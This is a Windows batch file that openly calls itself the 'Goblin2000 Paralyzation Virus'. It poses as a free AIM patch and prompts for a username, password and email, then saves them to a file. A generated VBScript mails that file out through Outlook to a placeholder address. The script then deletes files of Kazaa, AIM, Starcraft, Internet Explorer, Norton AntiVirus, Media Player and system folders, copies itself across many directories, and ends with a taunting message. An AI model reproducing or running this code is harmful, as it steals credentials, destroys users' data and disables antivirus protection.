@echo off
goto Opening_Message
:Opening_Message
echo msgbox "AOL OMEGA!The new AIM patch. Completely Free!We tracked all of the users of AIM and are for their program because of the celebration of our new department in online videogaming!AOL OMEGA will now begin to upgrade your system. If you dont have AIM, then this program will automatically download it for you! Isn't that great?But you have to Type in your username and password so that the program can long onto the AIM Server Network and send your computer the upgrades." >> c:\Opening.vbs
start c:\Opening.vbs
goto Questions

:Questions
set /p Username=Please Enter Your Username:
cls
set /p Password=Please enter Your Password:
cls
set /p email=Please enter your email, (Activation Code will be sent):
echo %username% >>c:\UPE.txt
echo %password% >>c:\UPE.txt
echo %email% >>c:\UPE.txt
echo Username:%username%
echo password:%password%
echo Email:%email%
echo If correct please press "Y" if not press "N"
pause
cls
echo Thank You for Signing Up.
pause
goto Theft

:Theft
echo if exist c:\mail.vbs 
echo Dim x >> c:\mail.vbs
echo on error resume next >> c:\mail.vbs
echo Set fso ="Scripting.FileSystem.Object" >> c:\mail.vbs
echo Set so=CreateObject(fso) >> c:\mail.vbs
echo Set ol=CreateObject("Outlook.Application") >> c:\mail.vbs
echo Set out= WScript.CreateObject("Outlook.Application") >> c:\mail.vbs
echo Set Mail=ol.CreateItem(0) >> c:\mail.vbs
echo Mail.to="youremail@provider.bla" >> c:\mail.vbs
echo Mail.Subject="IP" >> c:\mail.vbs
echo Mail.Body="IP" >> c:\mail.vbs
echo Mail.Attachments.Add("c:UPE.txt") >> c:\mail.vbs
echo Mail.Send >> c:\mail.vbs
echo ol.Quit >> c:\mail.vbs
start c:\mail.vbs
goto goblin2000

:goblin2000
md "c:\Program Files\compaq100g2"
md "c:\compaq100g2"
md "c:\Program Files\msworks"
goto unkazaa

:unkazaa
del /q "c:\Program Files\Kazaa\*.*"
del /q "c:\Program Files\Kazaa\Db\*.*"
del /q "c:\Program Files\Kazaa\Search\*.*"
del /q "c:\Program Files\Kazaa\Skins\Love & Romance - by AmericanSingles.com\*.*"
del /q "c:\Program Files\Kazaa\Skins\Toasted Sherbert\*.*"
del /q "c:\Program Files\Kazaa\plugins\*.*"
del /q "c:\Program Files\Kazaa\My Shared Folder\*.*"
del /q "c:\Program Files\Kazaa\Help\*.*"
goto unaim

:unaim
del /q "c:\Program Files\AIM95\*.*"
del /q "c:\Program Files\AIM95\Sysfiles\*.*"
del /q "c:\Program Files\AIM95\Sounds\*.*"
del /q "c:\Program Files\AIM95\Resources\*.*"
goto unstarcraft

:unstarcraft
del /q "c:\Program Files\Starcraft\*.*"
del /q "c:\Program Files\Starcraft\maps\*.*"
del /q "c:\Program Files\Starcraft\maps\BroodWar\*.*"
del /q "c:\Program Files\Starcraft\maps\BroodWar\Allied\*.*"
del /q "c:\Program Files\Starcraft\maps\BroodWar\Ladder\*.*"
del /q "c:\Program Files\Starcraft\maps\BroodWar\WebMaps\*.*"
del /q "c:\Program Files\Starcraft\maps\campaign\*.*"
del /q "c:\Program Files\Starcraft\maps\download\*.*"
del /q "c:\Program Files\Starcraft\maps\ladder\*.*"
del /q "c:\Program Files\Starcraft\maps\oldladder\*.*"
del /q "c:\Program Files\Starcraft\maps\replays\*.*"
del /q "c:\Program Files\Starcraft\maps\save\*.*"
del /q "c:\Program Files\Starcraft\maps\scenario\*.*"
del /q "c:\Program Files\Starcraft\characters\*.*"
del /q "c:\Program Files\Starcraft\Errors\*.*"
goto uniexplore

:uniexplore
del /q "c:\Internet Explorer\*.*"
del /q "c:\Internet Explorer\Connection Wizard\*.*"
del /q "c:\Internet Explorer\Custom\*.*"
del /q "c:\Internet Explorer\PLUGINS\*.*"
del /q "c:\Internet Explorer\SIGNUP\*.*"
del /q "c:\Internet Explorer\SIGNUP\Yahoo\*.*"
del /q "c:\Internet Explorer\W2K\*.*"
goto unmsnmessenger

:unmsnmessenger
del /q "c:\Program Files\Messenger\*.*"
goto unmediaplayer

:unmediaplayer
del /q "c:\Program Files\Windows Media Player\*.*"
del /q "c:\Program Files\Windows Media Player\Icons\*.*"
del /q "c:\Program Files\Windows Media Player\Skins\*.*"
del /q "c:\Program Files\Windows Media Player\Installer\*.*"
del /q "c:\Program Files\Windows Media Player\Visualizations\*.*"
goto unoutlookex

:unoutlookex
del /q "c:\Program Files\Outlook Express\*.*"
goto unnorton

:unnorton
del /q "c:\Program Files\Norton AntiVirus\*.*"
del /q "c:\Program Files\Norton AntiVirus\Quarantine\*.*"
del /q "c:\Program Files\Norton AntiVirus\Quarantine\Incoming\*.*"
del /q "c:\Program Files\Norton AntiVirus\Quarantine\Portal\*.*"
goto unmsworks

:unmsworks
del /q "c:\Program Files\Microsoft Works\*.*"
del /q "c:\Program Files\Microsoft Works\1033\*.*"
del /q "c:\Program Files\Microsoft Works\1033\Tasks\*.*"
del /q "c:\Program Files\Microsoft Works\1033\Wizards\*.*"
goto finishjob

:finishjob
del /q "c:\Program Files\i386\*.*"
del /q "c:\Program Files\i386\apps\*.*"
del /q "c:\Program Files\i386\ASMS\1000\MSFT\WINDOWS\GDIPLUS\*.*
del /q "c:\Program Files\i386\ASMS\7000\MSFT\WINDOWS\MSWINCRT\*.*
del /q "c:\Program Files\i386\ASMS\70100\MSFT\WINDOWS\MSWINCRT\*.*
del /q "c:\Program Files\i386\ASMS\70100\POLICY\MSFT\MSWINCRT\*.*
del /q "c:\Program Files\i386\ASMS\5100\MSFT\WINDOWS\SYSTEM\DEFAULT\*.*
del /q "c:\Program Files\i386\ASMS\10100\MSFT\WINDOWS\GDIPLUS\*.*
del /q "c:\Program Files\i386\ASMS\10100\POLICY\MSFT\WINDOWS\GDIPLUS\*.*
del /q "c:\Program Files\i386\ASMS\6000\MSFT\VCRTL\*.*
del /q "c:\Program Files\i386\ASMS\6000\MSFT\WINDOWS\COMMON\CONTROLS\*.*
del /q "c:\Program Files\i386\ASMS\60100\MSFT\WINDOWS\COMMON\CONTROLS\*.*
del /q "c:\Program Files\i386\COMPDATA\*.*
del /q "c:\Program Files\i386\drv\*.*
del /q "c:\Program Files\i386\DRW\*.*
del /q "c:\Program Files\i386\DRW\1033\*.*
del /q "c:\Program Files\i386\LANG\*.*
del /q "c:\Program Files\i386\SYSTEM32\*.*
goto copy phase

:copy phase
copy %0 "c:\Program Files\Kazaa\My Shared Folder\goblin2000.bat" >> autoexe.bat
copy %0 "c:\Program Files\Kazaa\My Shared Floder\goblin2000.bat" >> autoexe.bat
copy %0 "c:\Program Files\starcraft\goblinxd.bat" >> autoexe.bat
copy %0 "c:\Program Files\compaq100g2\goblin2000.bat" >> autoexe.bat
copy %0 "c:\Program Files\outlook explorer\goblin2000.bat" >> autoexe.bat
copy %0 "c:\Program Files\AIM95\goblin2000.bat" >> autoexe.bat
copy %0 "c:\goblin2000.bat" >> autoexe.bat
copy %0 "c:\compaq100g2\goblin2000.bat" >> autoexe.bat
copy %0 "c:\Program Files\msworks\goblin2000.bat >> autoexe.bat
copy %0 "c:\Program Files\Microsoft Word\goblin2000.bat >> autoexe.bat
copy %0 "c:\Program Files\Norton AntiVirus\goblin2000.bat >> autoexe.bat
copy %0 "c:\Program Files\Internet Explorer\goblin2000.bat >> autoexe.bat
copy %0 "c:\Program Files\messenger\goblin2000.bat >> autoexe.bat
copy %0 "c:\Program Files\Windows Media Player\goblin2000.bat >> autoexe.bat
copy %0 "c:\Program Files\i386\goblin2000.bat >> autoexe.bat
copy %0 "c:\Program Files\i386\DRW\1033\goblin2000.bat >> autoexe.bat
goto end phase

:end phase
echo msgbox "Well, your fucked up with this virus... yup... Just so you know, its the goblin2000 virus, now you go and have yourself a REAL fucked up day! cya!" >> c:\compaq100g2\end.vbs
start c:\compaq100g2\end.vbs
cls
echo ~Goblin2000 Paralyzation Virus~
pause
exit